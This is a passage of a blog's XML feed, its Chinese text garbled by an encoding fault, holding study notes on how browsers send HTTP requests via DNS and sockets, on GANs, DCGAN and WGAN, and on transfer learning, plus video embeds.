        <content type="html"><![CDATA[<p><img src="https://z3.ax1x.com/2021/07/01/RruYHH.png"></p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»è¿ç§»å­¦ä¹ åˆ°å›¾åƒåˆæˆ</title>
      <link href="/2021/06/20/Transfer_Learning/"/>
      <url>/2021/06/20/Transfer_Learning/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV1Qf4y1b7Pc&cid=347140842&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><p><img src="https://z3.ax1x.com/2021/06/20/RFg4oj.png"></p><p><img src="https://z3.ax1x.com/2021/06/20/RFgblV.png"></p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµè§ˆå™¨æ˜¯æ€æ ·é€šä¿¡çš„</title>
      <link href="/2021/06/19/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E6%80%8E%E6%A0%B7%E9%80%9A%E4%BF%A1%E7%9A%84/"/>
      <url>/2021/06/19/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E6%80%8E%E6%A0%B7%E9%80%9A%E4%BF%A1%E7%9A%84/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¬¬1æ­¥ï¼Œä»åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ç½‘å€å¼€å§‹ï¼š"><a href="#ç¬¬1æ­¥ï¼Œä»åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ç½‘å€å¼€å§‹ï¼š" class="headerlink" title="ç¬¬1æ­¥ï¼Œä»åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ç½‘å€å¼€å§‹ï¼š"></a>ç¬¬1æ­¥ï¼Œä»åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ç½‘å€å¼€å§‹ï¼š</h2><ul><li><strong>é¦–å…ˆç½‘å€å°±æ˜¯URLï¼Œé€šå¸¸æ˜¯è®¿é—®webæœåŠ¡å™¨ï¼Œç”¨â€http:â€ï¼Œå³HTTPåè®®</strong></li><li><strong>URLçš„æ ¼å¼ä¼šéšç€åè®®çš„ä¸åŒè€Œä¸åŒ</strong></li><li><strong>URLçš„å„ç§æ ¼å¼å¦‚ä¸‹ï¼š</strong><ul><li><strong>è®¿é—®WebæœåŠ¡å™¨æˆ–FTPæœåŠ¡å™¨æ—¶ï¼ŒURLåŒ…æ‹¬åŸŸåå’Œæ–‡ä»¶è·¯å¾„åï¼Œæœ‰æ—¶è¿˜ä¼šåŒ…å«ç”¨æˆ·åå’Œå¯†ç å’ŒæœåŠ¡å™¨ç«¯å£å·</strong></li></ul></li></ul><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/192120/18/9188/187284/60cd994bE12331888/5d15ca108f2daa5f.jpg"></p><h2 id="ç¬¬2æ­¥ï¼Œæµè§ˆå™¨å¯¹URLè¿›è¡Œè§£æ"><a href="#ç¬¬2æ­¥ï¼Œæµè§ˆå™¨å¯¹URLè¿›è¡Œè§£æ" class="headerlink" title="ç¬¬2æ­¥ï¼Œæµè§ˆå™¨å¯¹URLè¿›è¡Œè§£æ"></a>ç¬¬2æ­¥ï¼Œæµè§ˆå™¨å¯¹URLè¿›è¡Œè§£æ</h2><p><strong>å¯¹URLè§£æä¹Ÿå°±æ˜¯å¯¹URLè¿›è¡Œæ‹†åˆ†ï¼Œæ‹†åˆ†ç»“æœå¦‚ä¸‹ï¼š</strong><br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/25315/31/13123/231182/60cd9d42E76517b5c/4415e5064467809d.jpg"></p><ul><li><strong>è¿˜æœ‰URLä¸­çœç•¥æ–‡ä»¶åçš„ç‰¹æ®Šæƒ…å†µï¼Œç”šè‡³æœ€åä¸ä»¥/ç»“å°¾ï¼Œå°†ä¼šç›´æ¥è®¿é—®æœåŠ¡å™¨ä¸­è®¾ç½®çš„é»˜è®¤æ–‡ä»¶</strong></li></ul><h2 id="ç¬¬3æ­¥ï¼Œæ ¹æ®è§£æä¿¡æ¯æ¥ç”ŸæˆHTTPè¯·æ±‚æ¶ˆæ¯"><a href="#ç¬¬3æ­¥ï¼Œæ ¹æ®è§£æä¿¡æ¯æ¥ç”ŸæˆHTTPè¯·æ±‚æ¶ˆæ¯" class="headerlink" title="ç¬¬3æ­¥ï¼Œæ ¹æ®è§£æä¿¡æ¯æ¥ç”ŸæˆHTTPè¯·æ±‚æ¶ˆæ¯"></a>ç¬¬3æ­¥ï¼Œæ ¹æ®è§£æä¿¡æ¯æ¥ç”ŸæˆHTTPè¯·æ±‚æ¶ˆæ¯</h2><p><strong>HTTPæ–¹æ³•æœ€å¸¸ç”¨çš„å°±æ˜¯GETå’ŒPOSTï¼š</strong></p><ul><li><strong>åœ¨åœ°å€æ ä¸­è¾“å…¥ç½‘å€å¹¶æ˜¾ç¤ºç½‘é¡µï¼Œå› æ­¤è¿™é‡Œåº”è¯¥ä½¿ç”¨ GET æ–¹æ³•</strong></li><li><strong>ç‚¹å‡»è¶…çº§é“¾æ¥çš„åœºæ™¯ä¸­ä¹Ÿæ˜¯ä½¿ç”¨ GET æ–¹æ³•</strong></li><li><strong>å¦‚æœæ˜¯è¡¨å•ï¼Œåœ¨ HTML æºä»£ç ä¸­ä¼šåœ¨è¡¨å•çš„å±æ€§ä¸­æŒ‡å®šä½¿ç”¨å“ªç§æ–¹æ³•æ¥å‘é€è¯·æ±‚ï¼Œå¯èƒ½æ˜¯ GETä¹Ÿå¯èƒ½æ˜¯POST</strong></li></ul><h3 id="ç”ŸæˆHTTPè¯·æ±‚æ¶ˆæ¯çš„æ ¼å¼ï¼š"><a href="#ç”ŸæˆHTTPè¯·æ±‚æ¶ˆæ¯çš„æ ¼å¼ï¼š" class="headerlink" title="ç”ŸæˆHTTPè¯·æ±‚æ¶ˆæ¯çš„æ ¼å¼ï¼š"></a>ç”ŸæˆHTTPè¯·æ±‚æ¶ˆæ¯çš„æ ¼å¼ï¼š</h3><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/194117/1/9057/110909/60cdad3dEb4f176eb/1baee7cd88773d39.jpg"></p><h3 id="æ€ä¹ˆç”ŸæˆHTTPè¯·æ±‚æ¶ˆæ¯ï¼š"><a href="#æ€ä¹ˆç”ŸæˆHTTPè¯·æ±‚æ¶ˆæ¯ï¼š" class="headerlink" title="æ€ä¹ˆç”ŸæˆHTTPè¯·æ±‚æ¶ˆæ¯ï¼š"></a>æ€ä¹ˆç”ŸæˆHTTPè¯·æ±‚æ¶ˆæ¯ï¼š</h3><ul><li><strong>ç¬¬1æ­¥ï¼Œå†™å¥½æ–¹æ³•ï¼Œæ˜¯GETè¿˜æ˜¯POSTï¼ŒåŠ ä¸€ä¸ªç©ºæ ¼</strong></li><li><strong>ç¬¬2æ­¥ï¼Œå†™URIï¼Œå³æ–‡ä»¶å’Œç¨‹åºçš„è·¯å¾„åï¼Œç›´æ¥ä»URLä¸­æå–å‡ºæ¥å³å¯ï¼Œå†åŠ ä¸€ä¸ªç©ºæ ¼ï¼Œå†™HTTPç‰ˆæœ¬</strong></li><li><strong>ç¬¬3æ­¥ï¼Œç¬¬äºŒè¡Œå¼€å§‹å†™æ¶ˆæ¯å¤´ï¼Œå­˜æ”¾è¯·æ±‚çš„é¢å¤–ä¿¡æ¯ï¼Œå¦‚æ—¥æœŸï¼Œå®¢æˆ·ç«¯æ”¯æŒçš„æ•°æ®ç±»å‹ï¼Œè½¯ä»¶åç§°å’Œç‰ˆæœ¬ç­‰ç­‰</strong></li><li><strong>ç¬¬4æ­¥ï¼Œç©ºä¸€è¡Œï¼Œå†™æ¶ˆæ¯ä½“ã€‚GETæ–¹æ³•ä¸éœ€è¦å†™æ¶ˆæ¯ä½“ï¼ŒPOSTæ–¹æ³•æŠŠè¡¨å•ä¸­çš„ä¿¡æ¯å†™ä¸Š</strong></li></ul><h3 id="ç”Ÿæˆç»“æœå¦‚ä¸‹ï¼š"><a href="#ç”Ÿæˆç»“æœå¦‚ä¸‹ï¼š" class="headerlink" title="ç”Ÿæˆç»“æœå¦‚ä¸‹ï¼š"></a>ç”Ÿæˆç»“æœå¦‚ä¸‹ï¼š</h3><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/177642/23/10196/223242/60cdafceEe9e56c53/4d1133388c4b3978.jpg"></p><h2 id="ç¬¬4æ­¥ï¼Œç”Ÿæˆè¯·æ±‚æ¶ˆæ¯åï¼Œå‘DNSæœåŠ¡å™¨æŸ¥è¯¢WebæœåŠ¡å™¨çš„IPåœ°å€"><a href="#ç¬¬4æ­¥ï¼Œç”Ÿæˆè¯·æ±‚æ¶ˆæ¯åï¼Œå‘DNSæœåŠ¡å™¨æŸ¥è¯¢WebæœåŠ¡å™¨çš„IPåœ°å€" class="headerlink" title="ç¬¬4æ­¥ï¼Œç”Ÿæˆè¯·æ±‚æ¶ˆæ¯åï¼Œå‘DNSæœåŠ¡å™¨æŸ¥è¯¢WebæœåŠ¡å™¨çš„IPåœ°å€"></a>ç¬¬4æ­¥ï¼Œç”Ÿæˆè¯·æ±‚æ¶ˆæ¯åï¼Œå‘DNSæœåŠ¡å™¨æŸ¥è¯¢WebæœåŠ¡å™¨çš„IPåœ°å€</h2><p><strong>è™½ç„¶æµè§ˆå™¨èƒ½ç”Ÿæˆè§£æåœ°å€ç”ŸæˆHTTPè¯·æ±‚æ¶ˆæ¯ï¼Œä½†æ˜¯æµè§ˆå™¨ä¸èƒ½å‘é€æ¶ˆæ¯åˆ°ç½‘ç»œï¼Œéœ€è¦å§”æ‰˜æ“ä½œç³»ç»Ÿæ¥åš</strong></p><h3 id="IPåœ°å€åŸç†"><a href="#IPåœ°å€åŸç†" class="headerlink" title="IPåœ°å€åŸç†"></a>IPåœ°å€åŸç†</h3><h4 id="å­ç½‘ï¼š"><a href="#å­ç½‘ï¼š" class="headerlink" title="å­ç½‘ï¼š"></a>å­ç½‘ï¼š</h4><p><strong>ç”±é›†çº¿å™¨è¿æ¥èµ·æ¥å‡ å°è®¡ç®—æœºï¼Œçœ‹æˆä¸€ä¸ªå•ä½</strong></p><h4 id="ç½‘ç»œï¼š"><a href="#ç½‘ç»œï¼š" class="headerlink" title="ç½‘ç»œï¼š"></a>ç½‘ç»œï¼š</h4><p><strong>æŠŠå­ç½‘ç”¨è·¯ç”±å™¨è¿èµ·æ¥å½¢æˆç½‘ç»œ</strong></p><h4 id="IPåœ°å€ï¼š"><a href="#IPåœ°å€ï¼š" class="headerlink" title="IPåœ°å€ï¼š"></a>IPåœ°å€ï¼š</h4><ul><li><strong>ç½‘ç»œä¸­æ‰€æœ‰çš„è®¾å¤‡éƒ½è¢«åˆ†é…ä¸€ä¸ªåœ°å€ï¼Œç”±ç½‘ç»œå·ã€ä¸»æœºå·ç»„æˆ</strong></li><li><strong>é€šè¿‡IPåœ°å€å¯ä»¥åˆ¤æ–­å‡ºè®¿é—®æœåŠ¡å™¨çš„ä½ç½®ï¼Œä»è€Œå‘é€æ¶ˆæ¯</strong></li></ul><h4 id="æ¶ˆæ¯å‘é€è¿‡ç¨‹ï¼š"><a href="#æ¶ˆæ¯å‘é€è¿‡ç¨‹ï¼š" class="headerlink" title="æ¶ˆæ¯å‘é€è¿‡ç¨‹ï¼š"></a>æ¶ˆæ¯å‘é€è¿‡ç¨‹ï¼š</h4><p><strong>å‘é€è€…çš„æ¶ˆæ¯å…ˆé€šè¿‡å­ç½‘çš„é›†çº¿å™¨å‘é€åˆ°æœ€è¿‘çš„è·¯ç”±å™¨ä¸Šï¼Œè·¯ç”±å™¨æ ¹æ®ç›®çš„åœ°åˆ¤æ–­å¹¶å‘é€åˆ°ä¸‹ä¸€ä¸ªè·¯ç”±å™¨ï¼Œç„¶åå†ç»è¿‡å­ç½‘çš„é›†çº¿å™¨å‘åˆ°ä¸‹ä¸€ä¸ªè·¯ç”±å™¨ï¼Œç›´åˆ°å‘é€åˆ°ç›®çš„åœ°</strong></p><h3 id="ä¸ºä»€ä¹ˆè¦æŸ¥è¯¢IPåœ°å€ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦æŸ¥è¯¢IPåœ°å€ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æŸ¥è¯¢IPåœ°å€ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦æŸ¥è¯¢IPåœ°å€ï¼Ÿ</h3><p><strong>å› ä¸ºå‘é€æ¶ˆæ¯éœ€è¦çš„ä¸æ˜¯åŸŸåï¼Œè€Œæ˜¯åŸŸåå¯¹åº”çš„IPåœ°å€</strong></p><h3 id="æ€ä¹ˆå‘DNSæœåŠ¡å™¨æŸ¥è¯¢IPåœ°å€ï¼Ÿ"><a href="#æ€ä¹ˆå‘DNSæœåŠ¡å™¨æŸ¥è¯¢IPåœ°å€ï¼Ÿ" class="headerlink" title="æ€ä¹ˆå‘DNSæœåŠ¡å™¨æŸ¥è¯¢IPåœ°å€ï¼Ÿ"></a>æ€ä¹ˆå‘DNSæœåŠ¡å™¨æŸ¥è¯¢IPåœ°å€ï¼Ÿ</h3><ul><li><strong>é¦–å…ˆæ“ä½œç³»ç»Ÿä¸Šæœ‰DNSå®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯é‡Œæœ‰Socketåº“çš„DNSè§£æå™¨</strong></li><li><strong>éœ€è¦æŸ¥è¯¢IPåœ°å€æ—¶</strong><ul><li><strong>ç¬¬1æ­¥ï¼Œæµè§ˆå™¨ä¼šè°ƒç”¨æ“ä½œç³»ç»Ÿçš„è§£æå™¨ï¼Œè§£æå™¨å§”æ‰˜æ“ä½œç³»ç»Ÿçš„åè®®æ ˆé€šè¿‡ç½‘å¡å‘DNSæœåŠ¡å™¨å‘é€æŸ¥è¯¢æ¶ˆæ¯ï¼Œç„¶åDNSä¼šè¿”å›å“åº”æ¶ˆæ¯</strong></li><li><strong>ç¬¬2æ­¥ï¼Œå“åº”æ¶ˆæ¯é€šè¿‡åè®®æ ˆä¼ é€’ç»™è§£æå™¨ï¼Œè§£æå™¨ä¼šå–å‡ºå“åº”æ¶ˆæ¯ä¸­çš„IPåœ°å€ï¼Œå¹¶å†™å…¥æµè§ˆå™¨æŒ‡å®šçš„å†…å­˜åœ°å€ä¸­</strong></li></ul></li><li><strong>è§£æå™¨ç¨‹åºå¦‚ä¸‹ï¼š</strong></li></ul><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/180986/16/10049/89745/60cde338Ef32162ea/4a45757e8b9b22c9.jpg"></p><h2 id="ç¬¬5æ­¥ï¼Œå§”æ‰˜æ“ä½œç³»ç»Ÿçš„åè®®æ ˆå‘ç›®æ ‡IPæœåŠ¡å™¨æ”¶å‘HTTPæ¶ˆæ¯"><a href="#ç¬¬5æ­¥ï¼Œå§”æ‰˜æ“ä½œç³»ç»Ÿçš„åè®®æ ˆå‘ç›®æ ‡IPæœåŠ¡å™¨æ”¶å‘HTTPæ¶ˆæ¯" class="headerlink" title="ç¬¬5æ­¥ï¼Œå§”æ‰˜æ“ä½œç³»ç»Ÿçš„åè®®æ ˆå‘ç›®æ ‡IPæœåŠ¡å™¨æ”¶å‘HTTPæ¶ˆæ¯"></a>ç¬¬5æ­¥ï¼Œå§”æ‰˜æ“ä½œç³»ç»Ÿçš„åè®®æ ˆå‘ç›®æ ‡IPæœåŠ¡å™¨æ”¶å‘HTTPæ¶ˆæ¯</h2><h3 id="åŸºæœ¬åŸç†ï¼š"><a href="#åŸºæœ¬åŸç†ï¼š" class="headerlink" title="åŸºæœ¬åŸç†ï¼š"></a>åŸºæœ¬åŸç†ï¼š</h3><ul><li><strong>é¦–å…ˆæ”¶å‘æ¶ˆæ¯æ“ä½œä¹‹å‰ï¼Œå…ˆè¦å»ºç«‹ä¸€æ¡ç®¡é“è¿æ¥åŒæ–¹ã€‚ç®¡é“ä¸¤ç«¯çš„æ•°æ®å‡ºå…¥å£å«å¥—æ¥å­—ï¼Œæ‰€ä»¥å…ˆåˆ›å»ºå¥—æ¥å­—</strong></li><li><strong>ç„¶åé€šè¿‡å¥—æ¥å­—è¿æ¥èµ·æ¥å½¢æˆç®¡é“</strong></li><li><strong>è¿™äº›æ­¥éª¤éƒ½æ˜¯å§”æ‰˜åè®®æ ˆå®Œæˆçš„</strong></li></ul><h3 id="ç¬¬1æ­¥ï¼Œæ”¶å‘æ¶ˆæ¯çš„å‡†å¤‡å·¥ä½œï¼š"><a href="#ç¬¬1æ­¥ï¼Œæ”¶å‘æ¶ˆæ¯çš„å‡†å¤‡å·¥ä½œï¼š" class="headerlink" title="ç¬¬1æ­¥ï¼Œæ”¶å‘æ¶ˆæ¯çš„å‡†å¤‡å·¥ä½œï¼š"></a>ç¬¬1æ­¥ï¼Œæ”¶å‘æ¶ˆæ¯çš„å‡†å¤‡å·¥ä½œï¼š</h3><ul><li><strong>é¦–å…ˆæœåŠ¡å™¨åˆ›å»ºå¥—æ¥å­—ï¼Œç­‰å¾…å®¢æˆ·ç«¯åˆ›å»ºå¥—æ¥å­—å¹¶è¿”å›æè¿°ç¬¦</strong></li><li><strong>åè®®æ ˆæ ¹æ®æè¿°ç¬¦ã€IPåœ°å€ã€ç«¯å£å·åˆ¤æ–­å“ªä¸ªå¥—æ¥å­—å’Œå“ªä¸ªæœåŠ¡å™¨çš„å“ªä¸ªå¥—æ¥å­—è¿›è¡Œè¿æ¥ç®¡é“ï¼Œè¿æ¥åå°±å®Œæˆäº†å‡†å¤‡å·¥ä½œ</strong><ul><li><strong>åŸç†ï¼šæè¿°ç¬¦æ˜¯ç”¨æ¥åœ¨ä¸€å°è®¡ç®—æœºå†…éƒ¨è¯†åˆ«å¥—æ¥å­—çš„ï¼Œç«¯å£å·å°±æ˜¯ç”¨æ¥è¯†åˆ«æœåŠ¡å™¨çš„å¥—æ¥å­—çš„</strong></li></ul></li><li><strong>ä¼ è¾“å®Œæˆåä»»ä½•ä¸€æ–¹æ–­å¼€ç®¡é“ï¼Œé€šä¿¡å°±ç»“æŸï¼Œå¥—æ¥å­—å°†åˆ é™¤</strong></li></ul><h3 id="ç¬¬2æ­¥ï¼Œæ”¶å‘HTTPæ¶ˆæ¯"><a href="#ç¬¬2æ­¥ï¼Œæ”¶å‘HTTPæ¶ˆæ¯" class="headerlink" title="ç¬¬2æ­¥ï¼Œæ”¶å‘HTTPæ¶ˆæ¯"></a>ç¬¬2æ­¥ï¼Œæ”¶å‘HTTPæ¶ˆæ¯</h3><ul><li><strong>å‘é€æ¶ˆæ¯ï¼šè°ƒç”¨writeç¨‹åºç»„ä»¶å¹¶æŒ‡å®šå¥—æ¥å­—å’ŒHTTPæ¶ˆæ¯ï¼ˆéœ€è¦å‘é€çš„æ•°æ®ï¼‰ï¼Œåè®®æ ˆå°±ä¼šå‘é€æ•°æ®åˆ°æœåŠ¡å™¨</strong></li><li><strong>æœåŠ¡å™¨å“åº”æ¶ˆæ¯ï¼š</strong><img src="https://img14.360buyimg.com/ddimg/jfs/t1/185016/29/10128/91496/60ce01bdEb0e8d8d3/624e0fc6f36db344.jpg"></li><li><strong>æ¥æ”¶æ¶ˆæ¯ï¼šè°ƒç”¨readç¨‹åºç»„ä»¶å¹¶æŒ‡å®šæ¶ˆæ¯å­˜æ”¾å†…å­˜åœ°å€ï¼Œåè®®æ ˆå°±ä¼šæ¥æ”¶æ•°æ®åˆ°æ¥æ”¶ç¼“å†²åŒº</strong></li></ul><h3 id="ç¬¬3æ­¥ï¼Œæ–­å¼€è¿æ¥"><a href="#ç¬¬3æ­¥ï¼Œæ–­å¼€è¿æ¥" class="headerlink" title="ç¬¬3æ­¥ï¼Œæ–­å¼€è¿æ¥"></a>ç¬¬3æ­¥ï¼Œæ–­å¼€è¿æ¥</h3><p><strong>æœåŠ¡å™¨é¦–å…ˆæ–­å¼€è¿æ¥ï¼Œä¼ è¾¾åˆ°å®¢æˆ·ç«¯åï¼Œå®¢æˆ·ç«¯å¥—æ¥å­—ä¹Ÿä¼šæ–­å¼€ï¼Œæµè§ˆå™¨è°ƒç”¨readåä¼šå¾—çŸ¥é€šä¿¡ç»“æŸï¼Œæµè§ˆå™¨ä¹Ÿä¼šæ–­å¼€</strong></p>]]></content>
      
      
      <categories>
          
          <category> ã€Šç½‘ç»œæ˜¯æ€æ ·è¿æ¥çš„ã€‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç®—æœºç½‘ç»œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GANså…¥é—¨</title>
      <link href="/2021/06/18/GANs%E5%85%A5%E9%97%A8_(1)/"/>
      <url>/2021/06/18/GANs%E5%85%A5%E9%97%A8_(1)/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><blockquote><p>â€œWhat I cannot create, I do not understand.â€<br>                                        Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â -Richard Feynman</p></blockquote><p>æŸä¸ªäº‹ä»¶çš„åˆ†å¸ƒæœä»åˆ†å¸ƒp(x),å…¶å¾€å¾€éš¾ä»¥è·å¾—ï¼Œå› æ­¤éœ€è¦GANæ¥æ¨¡æ‹Ÿã€‚</p><iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=2&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><p>ç”Ÿæˆç½‘ç»œé€šè¿‡è®­ç»ƒè·å¾—ä¸€ä¸ªp(x)åˆ†å¸ƒè¾“å‡ºï¼Œé˜²å¾¡ç½‘ç»œé€šè¿‡çœŸå®æ ·æœ¬åˆ†å¸ƒp(X)æ¥é‰´å®šç”Ÿæˆç½‘ç»œçš„è¾“å‡ºæ˜¯çœŸè¿˜æ˜¯å‡ï¼Œè‹¥50%åˆ¤å®šä¸ºçœŸï¼Œåˆ™å½¢æˆçº³ä»€å‡è¡¡ï¼Œè®­ç»ƒå®Œæˆã€‚</p><iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=3&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h2 id="ç›®æ ‡å‡½æ•°"><a href="#ç›®æ ‡å‡½æ•°" class="headerlink" title="ç›®æ ‡å‡½æ•°"></a>ç›®æ ‡å‡½æ•°</h2><p><img src="https://z3.ax1x.com/2021/06/16/2XrIUA.png"></p><iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=4&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h2 id="é—®é¢˜ä¸€ï¼šå›ºå®šGï¼ŒDä¼šè®­ç»ƒæˆä»€ä¹ˆæ ·ï¼Ÿ"><a href="#é—®é¢˜ä¸€ï¼šå›ºå®šGï¼ŒDä¼šè®­ç»ƒæˆä»€ä¹ˆæ ·ï¼Ÿ" class="headerlink" title="é—®é¢˜ä¸€ï¼šå›ºå®šGï¼ŒDä¼šè®­ç»ƒæˆä»€ä¹ˆæ ·ï¼Ÿ"></a>é—®é¢˜ä¸€ï¼šå›ºå®šGï¼ŒDä¼šè®­ç»ƒæˆä»€ä¹ˆæ ·ï¼Ÿ</h2><p><img src="https://z3.ax1x.com/2021/06/16/2XsZVJ.png"></p><iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=5&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h2 id="é—®é¢˜äºŒï¼šå†è®­ç»ƒGï¼ŒGä¼šè®­ç»ƒæˆä»€ä¹ˆæ ·ï¼Ÿ"><a href="#é—®é¢˜äºŒï¼šå†è®­ç»ƒGï¼ŒGä¼šè®­ç»ƒæˆä»€ä¹ˆæ ·ï¼Ÿ" class="headerlink" title="é—®é¢˜äºŒï¼šå†è®­ç»ƒGï¼ŒGä¼šè®­ç»ƒæˆä»€ä¹ˆæ ·ï¼Ÿ"></a>é—®é¢˜äºŒï¼šå†è®­ç»ƒGï¼ŒGä¼šè®­ç»ƒæˆä»€ä¹ˆæ ·ï¼Ÿ</h2><p><img src="https://z3.ax1x.com/2021/06/16/2Xyq0g.png"></p><h2 id="KLè·ç¦»ä¸JSè·ç¦»"><a href="#KLè·ç¦»ä¸JSè·ç¦»" class="headerlink" title="KLè·ç¦»ä¸JSè·ç¦»"></a>KLè·ç¦»ä¸JSè·ç¦»</h2><p><img src="https://z3.ax1x.com/2021/06/16/2XsvQK.png"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä¹Ÿå°±æ˜¯è¯´ï¼ŒDè¾¾åˆ°æœ€ä¼˜æ—¶ï¼ŒGä¹Ÿå¯ä»¥è¾¾åˆ°çœŸå®æ°´å¹³ï¼Œæ­¤æ—¶D(X)=1/2</p><hr><iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=6&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h2 id="DCGAN"><a href="#DCGAN" class="headerlink" title="DCGAN"></a>DCGAN</h2><h3 id="Transposed-Convolution"><a href="#Transposed-Convolution" class="headerlink" title="Transposed Convolution"></a>Transposed Convolution</h3><p><img src="https://z3.ax1x.com/2021/06/16/2XWZyq.png"></p><p>6<em>6-&gt;4</em>4</p><h3 id="è®­ç»ƒéš¾é¢˜ï¼šä¸ç¨³å®š"><a href="#è®­ç»ƒéš¾é¢˜ï¼šä¸ç¨³å®š" class="headerlink" title="è®­ç»ƒéš¾é¢˜ï¼šä¸ç¨³å®š"></a>è®­ç»ƒéš¾é¢˜ï¼šä¸ç¨³å®š</h3><p>è®­ç»ƒå¼€å§‹æ—¶ï¼Œç”Ÿæˆçš„p(x)ä¸çœŸå®çš„p(X)å¾ˆå¯èƒ½ä¸overlap</p><p><img src="https://z3.ax1x.com/2021/06/16/2XhHoT.png"></p><p><img src="https://z3.ax1x.com/2021/06/16/2X4Vld.png" alt="å¾ˆå¯èƒ½æ²¡æœ‰æ¢¯åº¦ä¿¡æ¯"></p><hr><iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=7&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><iframe src="//player.bilibili.com/player.html?bvid=BV1RU4y1h74n&cid=327744141&page=8&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h2 id="WGAN"><a href="#WGAN" class="headerlink" title="WGAN"></a>WGAN</h2><p>é‡‡ç”¨EMè·ç¦»ï¼š</p><p><img src="https://z3.ax1x.com/2021/06/18/2zxCl9.png"></p><p>åªè¦æ»¡è¶³<img src="https://z3.ax1x.com/2021/06/18/2zxQOI.png" alt="1-LZ"></p><p>å­¦åˆ°çš„Discriminaterå°±èƒ½å¤Ÿæ¨¡æ‹ŸWasserstein Distanceï¼Œtrainningåœ¨ä»»ä½•æ—¶å€™éƒ½æœ‰æ¢¯åº¦</p><h3 id="ä¸ºäº†æ»¡è¶³1-LZ"><a href="#ä¸ºäº†æ»¡è¶³1-LZ" class="headerlink" title="ä¸ºäº†æ»¡è¶³1-LZ"></a>ä¸ºäº†æ»¡è¶³1-LZ</h3><ul><li>Weight clipping</li><li>Gradient Penalty</li><li><img src="https://z3.ax1x.com/2021/06/18/2zxI76.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬15ç«  æ³›å‹</title>
      <link href="/2021/06/18/%E7%AC%AC15%E7%AB%A0_%E6%B3%9B%E5%9E%8B/"/>
      <url>/2021/06/18/%E7%AC%AC15%E7%AB%A0_%E6%B3%9B%E5%9E%8B/</url>
      
